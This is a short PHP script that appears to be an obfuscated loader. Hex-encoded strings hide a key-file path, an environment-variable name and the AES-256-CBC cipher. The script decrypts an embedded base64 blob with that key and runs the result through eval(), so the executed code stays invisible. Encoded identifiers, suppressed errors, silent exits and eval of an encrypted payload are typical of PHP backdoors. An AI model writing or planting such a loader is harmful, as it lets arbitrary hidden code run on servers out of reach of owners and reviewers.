<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('cyS7JWn24HKBnvDiIubQ4Q==');

$c=base64_decode(

'kkde/F+rIf45mUWFishWrlIyempeuuBLsxIQ4izyhrtDfswTtXhJcKsBvAfL1CJbDzNhD8qV79lJ' .
'HbqI5ifQ2FQ8WnErFov2CY8v+qblQbEjBaozdwHdt71Jpx7XRTTXZQJuEKg5gthbs1/62TRGJR6t' .
'OSah1nc+hu9qd92bkY2hI4KYShzNTaTj9YNTQgnK66wjaltsTntFmuWeohe/9uW0k47sECCfrY4K' .
'6Yxbhmi2GNngmrIkS2l1pWNXIoSE6faBGh1bIIoRmyPFXzla/o7HwtUXOj0qhCuXIs4YvbNiS6Zl' .
'U1WDkSLZkN/xcZJMm45x+AC/Ghn5cOYzDGqkXUG3bcL5TcycWGkEEXBSS8DXAq3t9rkHB8V0QMok' .
'+kidi5FlDYLBu9KsBeNDQIOeKlroTW0T53NOWBdwrbRiUNCCH+hyguD9nykjLRnklyaRgtV1/s6T' .
'QvDa+Rab7H8eVVtUUyfErwXrwdrYzogSaRgAhFtt6HHjdhuFs+p0W6/De2rujSgoTluP+tcW/VyQ' .
'a+/zLsYkYxK+yXUszvZGuUAxqK6IEGS63o1uRmxUe9BrAKwYtFaWrkIKr4XGksU09OftZ+6SrxK/' .
'y0JUfxYOrOtfbLu4x2B2bAyDpJKE9EbSDGlyMF3ALSDCQcALAT9lBoRIljzRD6ziEYgDG7MKBUSy' .
'oUfFsVzHV6nFiJio4M6yOiULFkNZJHhi2+eggWa+Y1Vmr3vonQHjrgxDQ+jLw+veXyrxPE20lBYE' .
'vbjbD1VfzmZnl5Jt053jD5TfmmxhmNPn64eEvwc1dVAjeSsSKJQZwh8PtqpblNwtmC/9Xai70wA6' .
'+UF1vyxNAQFrvsvCYbn5/Qpqou+J+MAZCYcVtGHdpEWVezBqEJeM2gCkrO4OmV46D7sg5E6ZNU3a' .
'iY5IAK3cdC7VUkvV5EgRRKLOGggeCdJVIkKH4cQ/3msy/1a5kIAzK7N7NRtSFVNtU98TG32PUSTw' .
'AckxZSYkpJyV3GNlss4x6711l3ITwGmkebVls6usGY5iTlRApD+6QubKQjB5xfCOP4rLzjVzLSwO' .
'g0Bt5OvUAmhlPgbPDvSSKmmlPYnyj+TUSZR/aCg0h0QiFpgg+lsIXBjbXBTlb7AUFA5BC1YTguzj' .
'HAhVbgVR5ntFWZ0x5gstI0HoTkpKc+mLm/TKvZrOJBBHERCnzTUF7+ZoHw9h4hnwTElNveC5ObRG' .
'v2GjNakfjuc+gVuRGl59Hb/NmqFnMmIRgbnE0QEIiDd5qp0MlJEz6fUAQyf5uMu/ufCpL7ZSEhiZ' .
'szjzWgxpD+Gmjr72yc1nA/AiFnyGt1XEevWZemj8VKwAackUp0JLFMyoHHTMFckQOl51KltxdA=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

